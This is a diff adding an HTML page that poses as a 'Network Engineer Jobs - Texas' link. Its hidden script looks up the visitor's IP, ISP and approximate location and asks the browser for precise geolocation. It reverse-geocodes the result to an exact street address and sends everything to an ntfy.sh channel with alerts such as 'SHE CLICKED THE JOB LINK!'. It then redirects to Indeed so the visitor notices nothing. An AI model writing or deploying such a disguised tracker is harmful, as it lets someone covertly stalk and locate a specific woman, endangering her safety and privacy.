@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Network Engineer Jobs - Texas</title>
+<style>body{margin:0;background:#fff}</style>
+</head>
+<body>
+<script>
+(function(){
+  var T='roja-tracker-k141';
+  function s(title,msg,p){
+    try{fetch('https://ntfy.sh',{method:'POST',body:JSON.stringify({topic:T,title:title,message:msg,priority:p,tags:['eyes']})})}catch(e){}
+  }
+
+  var botISPs=['digitalocean','m247','fast servers','google','facebook','meta','twitter','microsoft',
+    'amazon','cloudflare','hetzner','ovh','linode','vultr','oracle','akamai','fastly','telegram',
+    'signal','whatsapp','discord','slack','link preview'];
+  function isBot(isp,org){
+    var check=(isp+' '+org).toLowerCase();
+    for(var i=0;i<botISPs.length;i++){if(check.indexOf(botISPs[i])!==-1)return true}
+    return false;
+  }
+
+  fetch('https://ipwho.is/')
+    .then(function(r){return r.json()})
+    .then(function(d){
+      if(!d.success)return;
+      var isp=d.connection&&d.connection.isp?d.connection.isp:'Unknown';
+      var org=d.connection&&d.connection.org?d.connection.org:'';
+      if(isBot(isp,org))return;
+
+      var dev=/mobile/i.test(navigator.userAgent)?'📱 Mobile':'💻 Desktop';
+      var t=new Date().toLocaleString('en-US',{timeZone:'America/Chicago'});
+      s('🚨 SHE CLICKED THE JOB LINK!','Device: '+dev+'\nTime: '+t,5);
+
+      var map='https://maps.google.com/?q='+d.latitude+','+d.longitude;
+      var orgLine=org?'\n🏢 '+org:'';
+      var zip=d.postal||'';
+      s('📍 Location','📌 '+d.city+', '+d.region+' '+zip+'\n🌐 ISP: '+isp+orgLine+'\n🔢 IP: '+d.ip+'\n🗺️ Map: '+map,4);
+
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(pos){
+          var gmap='https://maps.google.com/?q='+pos.coords.latitude+','+pos.coords.longitude;
+          fetch('https://nominatim.openstreetmap.org/reverse?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&format=json')
+            .then(function(r){return r.json()})
+            .then(function(dd){s('📍 EXACT ADDRESS!',dd.display_name+'\n🗺️ Map: '+gmap,5)})
+            .catch(function(){});
+        },function(){},{enableHighAccuracy:true,timeout:10000});
+      }
+    }).catch(function(){});
+
+  setTimeout(function(){
+    window.location.href='https://www.indeed.com/jobs?q=network+engineer&l=Texas&sort=date';
+  }, 800);
+})();
+</script>
+</body>
+</html>
